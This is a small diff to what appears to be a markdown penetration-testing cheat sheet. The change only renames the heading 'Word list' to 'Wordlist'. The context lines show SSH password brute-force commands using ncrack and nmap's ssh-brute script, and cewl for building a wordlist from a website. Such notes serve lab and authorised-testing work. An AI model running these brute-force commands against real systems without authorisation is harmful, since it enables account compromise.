@@ -11,7 +11,7 @@ ncrack -U <usernames list> -P <passwords list> ssh://10.10.10.10
 nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s <ip>
 ```
 
-## Create Word list
+## Create Wordlist
 ### If HTTP/S and SSH are running
 ```bash
 cewl http://<ip> > wordlist.txt
